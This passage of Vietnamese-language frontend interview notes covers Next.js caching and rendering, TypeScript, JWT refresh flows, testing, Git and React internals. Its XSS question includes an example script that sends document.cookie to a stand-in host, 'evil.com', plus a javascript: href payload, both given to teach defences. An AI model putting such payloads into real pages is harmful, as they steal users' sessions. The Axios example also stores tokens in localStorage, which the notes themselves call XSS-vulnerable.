  error: Error & { digest?: string };
  reset: () => void;
}) {
  return (
    <div>
      <h2>Something went wrong!</h2>
      <p>{error.message}</p>
      <button onClick={() => reset()}>Try again</button>
    </div>
  );
}
```

#### 2. global-error.tsx - Error cho Root Layout

```tsx
"use client";

export default function GlobalError({
  error,
  reset,
}: {
  error: Error & { digest?: string };
  reset: () => void;
}) {
  return (
    <html>
      <body>
        <h2>Something went wrong!</h2>
        <button onClick={() => reset()}>Try again</button>
      </body>
    </html>
  );
}
```

#### 3. not-found.tsx - 404 Page

```tsx
// app/not-found.tsx
export default function NotFound() {
  return (
    <div>
      <h2>Not Found</h2>
      <p>Could not find requested resource</p>
      <Link href="/">Return Home</Link>
    </div>
  );
}

// Trigger manually:
import { notFound } from "next/navigation";

async function getPost(id: string) {
  const post = await fetchPost(id);
  if (!post) {
    notFound(); // Hiển thị not-found.tsx
  }
  return post;
}
```

#### Error Boundary Hierarchy

```
app/
├── error.tsx           # Catch errors trong app/*
├── global-error.tsx    # Catch errors trong root layout
├── dashboard/
│   ├── error.tsx       # Catch errors CHỈ trong dashboard/*
│   └── page.tsx
```

```
┌─────────────────────────────────────────────────┐
│ global-error.tsx (catch root layout errors)     │
│  ┌───────────────────────────────────────────┐  │
│  │ root layout.tsx                           │  │
│  │  ┌─────────────────────────────────────┐  │  │
│  │  │ error.tsx (catch app/* errors)      │  │  │
│  │  │  ┌───────────────────────────────┐  │  │  │
│  │  │  │ dashboard/error.tsx           │  │  │  │
│  │  │  │  ┌─────────────────────────┐  │  │  │  │
│  │  │  │  │ dashboard/page.tsx      │  │  │  │  │
│  │  │  │  └─────────────────────────┘  │  │  │  │
│  │  │  └───────────────────────────────┘  │  │  │
│  │  └─────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────┘  │
└─────────────────────────────────────────────────┘
```

---

### Next.js Caching - 4 Layers

```
┌────────────────────────────────────────────────────────────────────┐
│                     NEXT.JS CACHING LAYERS                         │
├────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. REQUEST MEMOIZATION (Server - trong 1 request)                 │
│     └─ Cache fetch calls với cùng URL trong 1 render pass         │
│                                                                     │
│  2. DATA CACHE (Server - persistent)                               │
│     └─ Cache kết quả fetch() trên server, persist across requests  │
│                                                                     │
│  3. FULL ROUTE CACHE (Server - persistent)                         │
│     └─ Cache HTML và RSC Payload của static routes                 │
│                                                                     │
│  4. ROUTER CACHE (Client - in-memory)                              │
│     └─ Cache RSC Payload trong browser khi navigate                │
│                                                                     │
└────────────────────────────────────────────────────────────────────┘
```

#### 1. Request Memoization

```tsx
// Trong 1 request, fetch cùng URL được dedupe
async function getUser(id: string) {
  // Fetch này được cache trong request
  const res = await fetch(`/api/user/${id}`);
  return res.json();
}

async function Page() {
  // 2 calls → CHỈ 1 request thực sự!
  const user1 = await getUser("123");
  const user2 = await getUser("123"); // Cache hit

  return <div>{user1.name}</div>;
}
```

**Đặc điểm:**

- Chỉ áp dụng cho `GET` requests
- Chỉ trong React component tree
- Reset sau mỗi request

#### 2. Data Cache

```tsx
// Default: cache forever (static)
fetch("https://api.example.com/data");

// Revalidate sau mỗi 60 giây
fetch("https://api.example.com/data", {
  next: { revalidate: 60 },
});

// Không cache (dynamic)
fetch("https://api.example.com/data", {
  cache: "no-store",
});

// Revalidate on-demand
import { revalidatePath, revalidateTag } from "next/cache";

// Gắn tag
fetch("https://api.example.com/posts", {
  next: { tags: ["posts"] },
});

// Revalidate by tag
revalidateTag("posts");

// Revalidate by path
revalidatePath("/blog");
```

#### 3. Full Route Cache

```tsx
// Static route (cached at build time)
export default async function Page() {
  const data = await fetch("https://api.example.com/data");
  return <div>{data}</div>;
}

// Dynamic route (không cache)
export const dynamic = "force-dynamic";
// hoặc
export const revalidate = 0;

// Opt-out specific functions:
import { cookies, headers } from "next/headers";
// Sử dụng cookies() hoặc headers() → route trở thành dynamic
```

**Route Segment Config:**

```tsx
// Trong page.tsx hoặc layout.tsx
export const dynamic = "auto" | "force-dynamic" | "error" | "force-static";
export const revalidate = false | 0 | number;
export const fetchCache =
  "auto" |
  "default-cache" |
  "force-cache" |
  "force-no-store" |
  "default-no-store" |
  "only-cache" |
  "only-no-store";
export const runtime = "nodejs" | "edge";
```

#### 4. Router Cache (Client-side)

```
User navigates: /page-a → /page-b → /page-a
                  ↓           ↓           ↓
               Fetch      Fetch       Cache hit!
               (30s)      (30s)       (từ lần đầu)
```

**Behavior:**

- Static routes: cache 5 phút
- Dynamic routes: cache 30 giây
- Prefetch (on viewport/hover): cache ngay

**Invalidate Router Cache:**

```tsx
import { useRouter } from "next/navigation";

const router = useRouter();
router.refresh(); // Invalidate current route

// Server Action revalidate cũng invalidate Router Cache
revalidatePath("/blog");
revalidateTag("posts");
```

---

### Caching Summary Table

| Cache               | Location | Purpose                | Duration                     | Invalidate                                                    |
| ------------------- | -------- | ---------------------- | ---------------------------- | ------------------------------------------------------------- |
| Request Memoization | Server   | Dedupe trong 1 request | 1 request                    | Auto                                                          |
| Data Cache          | Server   | Cache fetch results    | Persistent                   | `revalidatePath`, `revalidateTag`, `{ next: { revalidate } }` |
| Full Route Cache    | Server   | Cache static HTML/RSC  | Persistent (build)           | Revalidate, redeploy                                          |
| Router Cache        | Client   | Cache navigation       | 30s (dynamic), 5min (static) | `router.refresh()`, revalidate                                |

---

### Rendering Strategies trong Next.js

#### 1. Static Rendering (SSG) - Default

```tsx
// Rendered at BUILD TIME
export default async function Page() {
  // Data được fetch lúc build
  const data = await fetch("https://api.example.com/data");

  return <div>{data}</div>;
}

// Với dynamic routes, cần generateStaticParams
export async function generateStaticParams() {
  const posts = await fetch("https://api.example.com/posts").then((r) =>
    r.json()
  );

  return posts.map((post) => ({
    slug: post.slug,
  }));
}
```

**Khi nào dùng:**

- Marketing pages, blog posts
- Product pages
- Documentation
- Data không thay đổi thường xuyên

#### 2. Dynamic Rendering (SSR)

```tsx
// Rendered at REQUEST TIME
import { cookies, headers } from "next/headers";

export default async function Page() {
  // Sử dụng dynamic functions → SSR
  const cookieStore = cookies();
  const headersList = headers();

  // Hoặc fetch với cache: 'no-store'
  const data = await fetch("https://api.example.com/data", {
    cache: "no-store",
  });

  return <div>{data}</div>;
}

// Hoặc force dynamic
export const dynamic = "force-dynamic";
```

**Khi nào dùng:**

- User-specific data (dashboard, profile)
- Request-time info (cookies, headers, searchParams)
- Data thay đổi liên tục

#### 3. Incremental Static Regeneration (ISR)

```tsx
// Static + Revalidate
export default async function Page() {
  const data = await fetch("https://api.example.com/data", {
    next: { revalidate: 60 }, // Revalidate sau 60 giây
  });

  return <div>{data}</div>;
}

// Hoặc set ở route level
export const revalidate = 60;
```

**Cách hoạt động:**

```
Request 1 (0s):    Serve cached page
Request 2 (30s):   Serve cached page
Request 3 (61s):   Serve cached page, trigger background revalidation
Request 4 (62s):   Serve NEW cached page
```

**On-demand ISR:**

```tsx
// app/api/revalidate/route.ts
import { revalidatePath, revalidateTag } from "next/cache";

export async function POST(request: Request) {
  const { path, tag } = await request.json();

  if (tag) {
    revalidateTag(tag);
  } else if (path) {
    revalidatePath(path);
  }

  return Response.json({ revalidated: true });
}
```

#### 4. Client-Side Rendering (CSR)

```tsx
"use client";

import { useState, useEffect } from "react";

export default function Page() {
  const [data, setData] = useState(null);

  useEffect(() => {
    fetch("/api/data")
      .then((res) => res.json())
      .then(setData);
  }, []);

  if (!data) return <div>Loading...</div>;
  return <div>{data}</div>;
}
```

**Khi nào dùng:**

- Private dashboards (không cần SEO)
- Real-time data
- Interactive features

#### 5. Streaming với Suspense

```tsx
import { Suspense } from "react";

export default function Page() {
  return (
    <div>
      <h1>Dashboard</h1>

      {/* Stream các phần chậm */}
      <Suspense fallback={<Loading />}>
        <SlowComponent />
      </Suspense>

      <Suspense fallback={<Loading />}>
        <AnotherSlowComponent />
      </Suspense>
    </div>
  );
}

async function SlowComponent() {
  const data = await slowFetch(); // 3 giây
  return <div>{data}</div>;
}
```

**Kết quả:**

```
1. HTML với <h1> và Loading skeletons → gửi ngay
2. SlowComponent xong → stream vào
3. AnotherSlowComponent xong → stream vào
```

---

### Rendering Decision Chart

```
┌─────────────────────────────────────────────────────────────────┐
│                    RENDERING DECISION                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Data có thể fetch lúc build?                                   │
│  ├─ YES → Data thay đổi thường xuyên không?                     │
│  │        ├─ NO  → Static (SSG)                                 │
│  │        └─ YES → ISR (SSG + revalidate)                       │
│  │                                                               │
│  └─ NO  → Cần user-specific data?                               │
│           ├─ YES, từ server → Dynamic (SSR)                     │
│           └─ YES, từ client → CSR hoặc Server + Client hybrid   │
│                                                                  │
│  Cần SEO?                                                       │
│  ├─ YES → SSG, ISR, hoặc SSR                                    │
│  └─ NO  → CSR OK                                                │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

| Strategy      | Build | Request        | Data            | SEO |
| ------------- | ----- | -------------- | --------------- | --- |
| SSG (Static)  | ✅    | ❌             | Static          | ✅  |
| ISR           | ✅    | Background     | Periodic update | ✅  |
| SSR (Dynamic) | ❌    | ✅             | Real-time       | ✅  |
| CSR           | ❌    | Client-side    | Real-time       | ❌  |
| Streaming     | ❌    | ✅ Progressive | Mixed           | ✅  |

---

### TypeScript

---

#### Q37: Generics

**Answer:**

Generic = "Type parameter" - truyền type như truyền argument

```ts
// Function generic
function getFirst<T>(arr: T[]): T {
  return arr[0];
}
getFirst<number>([1, 2, 3]);
getFirst(["a", "b"]); // inferred as string

// API Response
interface ApiResponse<T> {
  data: T;
  status: number;
}

const userResponse: ApiResponse<User> = await fetchUser();
const productsResponse: ApiResponse<Product[]> = await fetchProducts();
```

**Constraints với extends:**

```ts
function findById<T extends { id: number }>(
  items: T[],
  id: number
): T | undefined {
  return items.find((item) => item.id === id);
}
```

---

#### Q38: unknown vs any

**Answer:**

**`any`** - Tắt hoàn toàn type checking:

```ts
let x: any = "hello";
x.foo(); // ✅ No error (runtime crash!)
x.bar.baz; // ✅ No error
```

**`unknown`** - Type-safe, phải check trước khi dùng:

```ts
let x: unknown = "hello";
x.foo(); // ❌ Error

if (typeof x === "string") {
  x.toUpperCase(); // ✅ OK
}
```

|                    | `any` | `unknown`     |
| ------------------ | ----- | ------------- |
| Assign từ any type | ✅    | ✅            |
| Access properties  | ✅    | ❌ Phải check |
| Type safe          | ❌    | ✅            |

> **Tip:** Dùng `unknown` thay `any` cho external data.

---

#### Q39: Utility types

**Answer:**

```ts
interface User {
  id: number;
  name: string;
  email: string;
  password: string;
}

// Pick - chọn một số properties
type PublicUser = Pick<User, "id" | "name" | "email">;

// Omit - bỏ một số properties
type UserWithoutPassword = Omit<User, "password">;

// Partial - tất cả optional
type UpdateUser = Partial<User>;

// Required - tất cả required
type RequiredUser = Required<User>;

// Readonly - tất cả readonly
type ReadonlyUser = Readonly<User>;

// Record - object với key type K, value type T
type UserRoles = Record<string, "admin" | "user">;

// ReturnType - lấy return type của function
type UserReturn = ReturnType<typeof getUser>;

// Combo
type UpdateUserDTO = Partial<Omit<User, "id">>;
```

---

### Security

---

#### Q40: XSS (Cross-Site Scripting)

**Answer:**

**XSS = Attacker inject malicious script vào website**

Ví dụ: User nhập comment:

```html
<script>
  fetch("evil.com?cookie=" + document.cookie);
</script>
```

**React đã protect sẵn:**

```jsx
const userInput = '<script>alert("XSS")</script>';
return <div>{userInput}</div>;
// Render: &lt;script&gt;... (text, không phải script)
```

**Vẫn có lỗ hổng:**

```jsx
// ❌ dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ❌ href với javascript:
<a href={userInput}>Click</a>  // userInput = "javascript:alert('XSS')"
```

**Phòng chống:**

- Sanitize HTML với DOMPurify
- Validate URLs
- Content Security Policy (CSP) headers
- HttpOnly cookies

---

#### Q41: CSRF (Cross-Site Request Forgery)

**Answer:**

**CSRF = Lừa user đã đăng nhập thực hiện action không mong muốn**

Ví dụ:

1. User đăng nhập bank.com (có session cookie)
2. User vào evil.com
3. evil.com có hidden form submit tới bank.com/transfer
4. Browser tự động gửi cookie → Chuyển tiền!

**Phòng chống:**

| Method               | Mô tả                                             |
| -------------------- | ------------------------------------------------- |
| CSRF Token           | Server generate token, client gửi kèm mỗi request |
| SameSite Cookie      | `SameSite=Strict` hoặc `Lax`                      |
| Check Origin/Referer | Verify request từ đúng domain                     |

```js
// CSRF Token
fetch('/api/transfer', {
  headers: { 'X-CSRF-Token': csrfToken }
});

// SameSite Cookie
Set-Cookie: session=abc; SameSite=Strict; HttpOnly; Secure
```

---

#### Q41.5: JWT Refresh Token - Cách hoạt động

**Answer:**

**Tại sao cần Refresh Token?**

```
Access Token ngắn hạn (15 phút) → Bảo mật cao, nhưng user phải login lại liên tục
Refresh Token dài hạn (7 ngày) → Dùng để lấy Access Token mới mà không cần login
```

---

**Flow hoạt động:**

```
┌─────────────────────────────────────────────────────────────────────┐
│                     JWT REFRESH TOKEN FLOW                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. LOGIN                                                           │
│     Client → POST /login { email, password }                        │
│     Server → { accessToken (15m), refreshToken (7d) }               │
│                                                                      │
│  2. API CALLS                                                       │
│     Client → Authorization: Bearer <accessToken>                    │
│     Server → 200 OK (nếu token valid)                               │
│                                                                      │
│  3. ACCESS TOKEN HẾT HẠN                                            │
│     Client → API call                                               │
│     Server → 401 Unauthorized                                       │
│                                                                      │
│  4. REFRESH                                                         │
│     Client → POST /refresh { refreshToken }                         │
│     Server → { accessToken (new), refreshToken (new - optional) }   │
│                                                                      │
│  5. RETRY API CALL                                                  │
│     Client → API call với accessToken mới                           │
│     Server → 200 OK                                                 │
│                                                                      │
│  6. REFRESH TOKEN HẾT HẠN                                           │
│     Server → 401 → Client redirect về /login                        │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

**Implementation với Axios Interceptor:**

```tsx
// api/axios.ts
import axios from "axios";

const api = axios.create({
  baseURL: "/api",
});

// Request interceptor: Gắn access token vào mọi request
api.interceptors.request.use((config) => {
  const accessToken = localStorage.getItem("accessToken");
  if (accessToken) {
    config.headers.Authorization = `Bearer ${accessToken}`;
  }
  return config;
});

// Response interceptor: Handle 401 và refresh token
let isRefreshing = false;
let failedQueue: Array<{
  resolve: (token: string) => void;
  reject: (error: any) => void;
}> = [];

const processQueue = (error: any, token: string | null) => {
  failedQueue.forEach((prom) => {
    if (token) {
      prom.resolve(token);
    } else {
      prom.reject(error);
    }
  });
  failedQueue = [];
};

api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // Nếu 401 và chưa retry
    if (error.response?.status === 401 && !originalRequest._retry) {
      // Nếu đang refresh, queue request này
      if (isRefreshing) {
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        }).then((token) => {
          originalRequest.headers.Authorization = `Bearer ${token}`;
          return api(originalRequest);
        });
      }

      originalRequest._retry = true;
      isRefreshing = true;

      try {
        const refreshToken = localStorage.getItem("refreshToken");
        const { data } = await axios.post("/api/refresh", { refreshToken });

        // Lưu tokens mới
        localStorage.setItem("accessToken", data.accessToken);
        if (data.refreshToken) {
          localStorage.setItem("refreshToken", data.refreshToken);
        }

        // Process các requests đang chờ
        processQueue(null, data.accessToken);

        // Retry request gốc
        originalRequest.headers.Authorization = `Bearer ${data.accessToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        processQueue(refreshError, null);

        // Refresh thất bại → logout
        localStorage.removeItem("accessToken");
        localStorage.removeItem("refreshToken");
        window.location.href = "/login";

        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }

    return Promise.reject(error);
  }
);

export default api;
```

---

**Lưu trữ Tokens - Best Practices:**

| Storage | Access Token | Refresh Token | Security |
|---------|--------------|---------------|----------|
| localStorage | ❌ XSS vulnerable | ❌ | Thấp |
| Memory (state) | ✅ Tốt nhất | ❌ Mất khi refresh | Cao |
| HttpOnly Cookie | ✅ | ✅ Tốt nhất | Cao |

**Recommended:**
```
Access Token  → Memory (React state/context)
Refresh Token → HttpOnly Cookie (server set)
```

```tsx
// Server response
res.cookie("refreshToken", token, {
  httpOnly: true,    // Không access được từ JS
  secure: true,      // Chỉ HTTPS
  sameSite: "strict", // Chống CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
});
```

---

**Token Rotation (Bảo mật cao hơn):**

```
Mỗi lần refresh → Server generate REFRESH TOKEN MỚI
→ Refresh token cũ bị invalidate ngay
→ Nếu attacker đánh cắp refresh token cũ → không dùng được
```

```tsx
// Server: POST /refresh
async function refresh(req, res) {
  const { refreshToken } = req.cookies;

  // Verify và check trong DB
  const payload = jwt.verify(refreshToken, REFRESH_SECRET);
  const storedToken = await db.refreshTokens.findOne({ token: refreshToken });

  if (!storedToken) {
    // Token đã bị sử dụng → có thể bị tấn công
    // Revoke TẤT CẢ tokens của user này
    await db.refreshTokens.deleteMany({ userId: payload.userId });
    return res.status(401).json({ error: "Token reuse detected" });
  }

  // Xóa token cũ
  await db.refreshTokens.delete({ token: refreshToken });

  // Tạo tokens mới
  const newAccessToken = generateAccessToken(payload.userId);
  const newRefreshToken = generateRefreshToken(payload.userId);

  // Lưu refresh token mới vào DB
  await db.refreshTokens.create({
    token: newRefreshToken,
    userId: payload.userId,
  });

  res.cookie("refreshToken", newRefreshToken, { httpOnly: true, secure: true });
  res.json({ accessToken: newAccessToken });
}
```

---

**Tóm tắt:**

| Concept | Giải thích |
|---------|------------|
| Access Token | Ngắn hạn (15m), gửi trong header |
| Refresh Token | Dài hạn (7d), HttpOnly cookie |
| Token Rotation | Đổi refresh token mỗi lần refresh |
| Queue Pattern | Handle nhiều requests cùng lúc khi 401 |
| Logout | Clear cả 2 tokens + invalidate ở server |

---

### Testing

---

#### Q42: Unit, Integration, E2E

**Answer:**

**Testing Pyramid:**

```
        /\        E2E (10% - ít, chậm)
       /  \
      /----\      Integration (20%)
     /------\
    /--------\    Unit (70% - nhiều, nhanh)
```

**Unit Test** - test isolated function/component:

```js
it("adds two numbers", () => {
  expect(sum(1, 2)).toBe(3);
});
```

**Integration Test** - test nhiều units làm việc cùng nhau:

```js
// Component + API mock
render(<UserList />);
await waitFor(() => {
  expect(screen.getByText("John")).toBeInTheDocument();
});
```

**E2E Test** - test real browser, real flow:

```js
// Playwright
await page.goto("/login");
await page.fill('[name="email"]', "test@example.com");
await page.click('button[type="submit"]');
await expect(page).toHaveURL("/dashboard");
```

| Loại               | Tools                               |
| ------------------ | ----------------------------------- |
| Unit / Integration | Jest, Vitest, React Testing Library |
| E2E                | Cypress, Playwright                 |

---

### Performance

---

#### Q43: Core Web Vitals

**Answer:**

Core Web Vitals = 3 metrics Google dùng để đánh giá UX và SEO:

**1. LCP (Largest Contentful Paint)** - Loading

- Thời gian load element lớn nhất
- Target: **< 2.5s**
- Fix: Optimize images, SSR, preload

**2. INP (Interaction to Next Paint)** - Interactivity

- Thời gian phản hồi khi user tương tác
- Target: **< 200ms**
- Fix: Reduce JS, code splitting, Web Workers

**3. CLS (Cumulative Layout Shift)** - Visual Stability

- Đo layout shift - nội dung nhảy khi load
- Target: **< 0.1**
- Fix: Set image dimensions, reserve space

**Đo lường:**

- Chrome DevTools → Lighthouse
- PageSpeed Insights
- `web-vitals` library

---

### Git

---

#### Q44: rebase vs merge

**Answer:**

**Merge** - tạo merge commit, giữ nguyên history:

```
      A---B---C  feature
     /         \
D---E---F---G---M  main
```

**Rebase** - rewrite history, linear:

```
              A'--B'--C'  feature
             /
D---E---F---G  main
```

|               | Merge            | Rebase        |
| ------------- | ---------------- | ------------- |
| History       | Giữ nguyên       | Linear, clean |
| Safe          | ✅ Không rewrite | ❌ Rewrite    |
| Shared branch | ✅ OK            | ❌ Nguy hiểm  |

**Workflow:**

```bash
# Update feature branch
git checkout feature
git rebase main

# Merge vào main (hoặc squash merge)
git checkout main
git merge --squash feature  # gộp thành 1 commit
```

> **Golden rule:** Không rebase branch đã push và có người khác dùng.

---

### Architecture

---

#### Q45: Clean Architecture / SOLID

**Answer:**

**Clean Architecture** - chia layers, dependency hướng vào trong:

```
┌─────────────────────────────────────┐
│       Frameworks & Drivers          │  (UI, DB)
│  ┌───────────────────────────────┐  │
│  │     Interface Adapters        │  │  (Controllers)
│  │  ┌─────────────────────────┐  │  │
│  │  │   Application Layer     │  │  │  (Use Cases)
│  │  │  ┌───────────────────┐  │  │  │
│  │  │  │  Domain/Entities  │  │  │  │  (Business Logic)
```

**SOLID:**
| | Principle | Ý nghĩa |
|--|-----------|---------|
| S | Single Responsibility | 1 class chỉ làm 1 việc |
| O | Open/Closed | Open for extension, closed for modification |
| L | Liskov Substitution | Subclass thay thế được parent |
| I | Interface Segregation | Interface nhỏ, specific |
| D | Dependency Inversion | Depend on abstractions |

---

### Behavioral

---

#### Q46: Production bug handling

**Answer:**

**Incident Response:**

```
DETECT → ASSESS → MITIGATE → FIX → POSTMORTEM
```

1. **Detect:** Sentry, monitoring, user reports
2. **Assess:** Severity? Impact? Bao nhiêu users?
3. **Mitigate:** Rollback / Feature flag off / Hotfix
4. **Fix:** Root cause analysis
5. **Postmortem:** Document, prevent future

> **Tip:** "Rollback first, debug later"

---

#### Q47: Task estimation

**Answer:**

**Quy trình:**

1. Clarify requirements
2. Break down thành subtasks
3. Identify unknowns
4. Estimate each part
5. Add buffer 20-30%

**Techniques:**

- T-shirt sizing: XS, S, M, L, XL
- Story points: 1, 2, 3, 5, 8, 13...
- Three-point: (Optimistic + 4×Likely + Pessimistic) / 6

> **Tip:** Nếu > 5 days → cần break down thêm.

---

### React Advanced

---

#### Q48: Context API performance

**Answer:**

**Vấn đề:** Khi value thay đổi → tất cả consumers re-render

**Khắc phục:**

1. **Split contexts** theo domain:

```jsx
<UserContext.Provider value={user}>
  <ThemeContext.Provider value={theme}>
```

2. **Memoize value:**

```jsx
const value = useMemo(() => ({ user, setUser }), [user]);
```

3. **Separate state và dispatch:**

```jsx
<StateContext.Provider value={state}>
  <DispatchContext.Provider value={dispatch}>
```

4. **use-context-selector library:**

```jsx
const theme = useContextSelector(MyContext, (v) => v.theme);
```

5. **Dùng state management:** Zustand, Jotai có selector

---

#### Q49: Debounce vs Throttle

**Answer:**

**Debounce = Chờ user ngừng, sau delay mới chạy**

```
Events:   --x--x--x--x--x----------
Debounce:                    |
                      (sau 500ms)
```

**Throttle = Chạy đều đặn mỗi X ms**

```
Events:   --x--x--x--x--x--x--x--
Throttle:   |        |        |
         (mỗi 500ms)
```

| Debounce        | Throttle       |
| --------------- | -------------- |
| Search input    | Window resize  |
| Form validation | Scroll events  |
| Auto-save       | Mouse tracking |

> **Tip nhớ:** Debounce = "Đợi xong hẵng làm", Throttle = "Làm đều đặn"

---

## Deep Dive: React Internals

### React Component Lifecycle - Chi tiết

#### Quá trình từ đầu đến cuối:

```
┌─────────────────────────────────────────────────────────────────────┐
│                         MOUNTING PHASE                               │
│  (Component được tạo và insert vào DOM lần đầu tiên)                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. Constructor / useState initialization                            │
│     ↓                                                                │
│  2. render() / Function component chạy                              │
│     ↓                                                                │
│  3. React tạo Virtual DOM                                           │
│     ↓                                                                │
│  4. React commit changes → Real DOM                                 │
│     ↓                                                                │
│  5. componentDidMount / useEffect(() => {}, [])                     │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│                         UPDATING PHASE                               │
│  (Khi state/props thay đổi)                                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. Trigger: setState / new props / context change                  │
│     ↓                                                                │
│  2. shouldComponentUpdate? (Class) / React.memo? (Function)         │
│     ↓                                                                │
│  3. render() / Function component chạy lại                          │
│     ↓                                                                │
│  4. React tạo Virtual DOM MỚI                                       │
│     ↓                                                                │
│  5. DIFFING: So sánh Virtual DOM cũ vs mới                          │
│     ↓                                                                │
│  6. RECONCILIATION: Tính toán minimal changes                       │
│     ↓                                                                │
│  7. Commit changes → Real DOM (chỉ phần thay đổi)                   │
│     ↓                                                                │
│  8. componentDidUpdate / useEffect cleanup + re-run                 │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│                        UNMOUNTING PHASE                              │
│  (Component bị remove khỏi DOM)                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. componentWillUnmount / useEffect cleanup function               │
│     ↓                                                                │
│  2. React remove khỏi Real DOM                                      │
│     ↓                                                                │
│  3. Garbage collection                                               │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

#### Ví dụ cụ thể với Function Component:

```jsx
function UserProfile({ userId }) {
  // ========== MOUNTING: Bước 1 - Initialization ==========
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  const renderCount = useRef(0);

  // ========== MOUNTING: Bước 2 - Render ==========
  // Function component chạy từ đầu đến cuối
  console.log("Render phase - runs every render");
  renderCount.current += 1;

  // ========== MOUNTING: Bước 5 - After DOM commit ==========
  useEffect(() => {
    console.log("Component mounted!");

    fetchUser(userId).then((data) => {
      setUser(data);
      setLoading(false);
    });

    // ========== UNMOUNTING: Cleanup ==========
    return () => {
      console.log("Component will unmount!");
    };
  }, []);

  // ========== UPDATING: Khi userId thay đổi ==========
  useEffect(() => {
    console.log("userId changed, refetching...");
    fetchUser(userId).then(setUser);

    return () => {
      console.log("Cleanup before refetch");
    };
  }, [userId]);

  if (loading) return <div>Loading...</div>;
  return <div>{user.name}</div>;
}
```

---

### Virtual DOM - Chi tiết

#### Virtual DOM là gì?

```
Virtual DOM = JavaScript object mô tả cấu trúc UI
```

```jsx
// JSX này:
<div className="container">
  <h1>Hello</h1>
  <p>World</p>
</div>

// Được chuyển thành Virtual DOM object:
{
  type: 'div',
  props: {
    className: 'container',
    children: [
      { type: 'h1', props: { children: 'Hello' } },
      { type: 'p', props: { children: 'World' } }
    ]
  }
}
```

#### Quá trình Virtual DOM hoạt động:

```
┌──────────────────────────────────────────────────────────────────┐
│ BƯỚC 1: RENDER PHASE (có thể bị interrupt - concurrent mode)    │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│  State thay đổi: setCount(1)                                     │
│         ↓                                                         │
│  React gọi component function                                     │
│         ↓                                                         │
│  Tạo Virtual DOM mới (React Elements tree)                       │
│                                                                   │
│  OLD Virtual DOM          NEW Virtual DOM                        │
│  ┌─────────────┐          ┌─────────────┐                        │
│  │ div         │          │ div         │                        │
│  │  ├─ h1      │          │  ├─ h1      │                        │
│  │  │  "0"     │    →     │  │  "1"     │  ← CHỈ KHÁC Ở ĐÂY     │
│  │  └─ button  │          │  └─ button  │                        │
│  └─────────────┘          └─────────────┘                        │
│                                                                   │
└──────────────────────────────────────────────────────────────────┘
                              ↓
┌──────────────────────────────────────────────────────────────────┐
│ BƯỚC 2: RECONCILIATION (Diffing Algorithm)                       │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│  React so sánh 2 trees:                                          │
│                                                                   │
│  1. So sánh root elements                                        │
│     - Cùng type? → Giữ DOM node, update attributes               │
│     - Khác type? → Destroy old tree, build new                   │
│                                                                   │
│  2. So sánh children (dùng "key" để identify)                    │
│     - Có key? → Tìm matching key, reorder nếu cần                │
│     - Không key? → So sánh theo index (có thể chậm)              │
│                                                                   │
│  3. Recursive so sánh subtrees                                   │
│                                                                   │
│  Output: List of minimal changes needed                          │
│          [{ type: 'UPDATE_TEXT', node: h1, value: '1' }]        │
│                                                                   │
└──────────────────────────────────────────────────────────────────┘
                              ↓
┌──────────────────────────────────────────────────────────────────┐
│ BƯỚC 3: COMMIT PHASE (không thể interrupt - synchronous)         │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│  React áp dụng changes vào Real DOM:                             │
│                                                                   │
│  1. DOM Mutations                                                │
│     document.querySelector('h1').textContent = '1';              │
│                                                                   │
│  2. Chạy useLayoutEffect (synchronous, before paint)             │
│                                                                   │
│  3. Browser Paint                                                │
│                                                                   │
│  4. Chạy useEffect (asynchronous, after paint)                   │
│                                                                   │
└──────────────────────────────────────────────────────────────────┘
```

#### Tại sao Virtual DOM nhanh?

```
KHÔNG có Virtual DOM:
┌─────────────────────────────────────────────────────┐
│ Mỗi thay đổi → Trực tiếp manipulate Real DOM        │
│                                                      │
│ setState() → DOM update → Browser reflow + repaint  │
│ setState() → DOM update → Browser reflow + repaint  │
│ setState() → DOM update → Browser reflow + repaint  │
│                                                      │
│ = 3 lần reflow/repaint (expensive!)                 │
└─────────────────────────────────────────────────────┘

CÓ Virtual DOM:
┌─────────────────────────────────────────────────────┐
│ Batch updates + Minimal DOM changes                  │
│                                                      │
│ setState() → Virtual DOM update (fast, in memory)   │
│ setState() → Virtual DOM update                     │
│ setState() → Virtual DOM update                     │
│           ↓                                          │
│ BATCH: Diff → 1 lần Real DOM update → 1 reflow     │
│                                                      │
│ = 1 lần reflow/repaint (efficient!)                 │
└─────────────────────────────────────────────────────┘
```

---

### 7 Nguyên nhân Component Re-render

```
┌─────────────────────────────────────────────────────────────────┐
│                    NGUYÊN NHÂN RE-RENDER                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. STATE THAY ĐỔI                                              │
│     └─ setState(), useState setter                              │
│                                                                  │
│  2. PROPS THAY ĐỔI                                              │
│     └─ Parent truyền props mới xuống                            │
│                                                                  │
│  3. PARENT RE-RENDER                                            │
│     └─ Parent render → tất cả children render (mặc định)        │
│                                                                  │
│  4. CONTEXT THAY ĐỔI                                            │
│     └─ Context value thay đổi → tất cả consumers render         │
│                                                                  │
│  5. HOOKS THAY ĐỔI                                              │
│     └─ Custom hooks internal state thay đổi                     │
│                                                                  │
│  6. forceUpdate() (Class component)                             │
